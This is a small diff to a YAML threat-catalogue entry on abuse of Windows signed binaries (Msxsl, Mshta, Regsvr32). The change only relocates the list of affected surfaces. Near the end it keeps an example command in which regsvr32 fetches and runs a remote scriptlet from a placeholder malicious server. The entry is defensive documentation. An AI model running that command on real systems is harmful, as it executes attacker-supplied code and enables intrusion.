@@ -31,6 +31,11 @@ threat:
     specified utilities Msxsl.exe, Mshta.exe, and Regsvr32.exe are present. 
     This often requires initial access through phishing, exploitation of vulnerabilities, 
     or use of valid credentials.
+  surface:
+    - Windows
+    - Active Directory
+    - Azure::Compute::Virtual Machines
+    - Windows::Desktop
   severity: Significant incident
   leverage: Elevation of privilege; Tampering; Spoofing
   impact: Data Breach; Business disruption; Reputational Damages; Legal and regulatory
@@ -67,8 +72,3 @@ threat:
     ```
     regsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll
     ```
-  surface:
-    - Windows
-    - Active Directory
-    - Azure::Compute::Virtual Machines
-    - Windows::Desktop
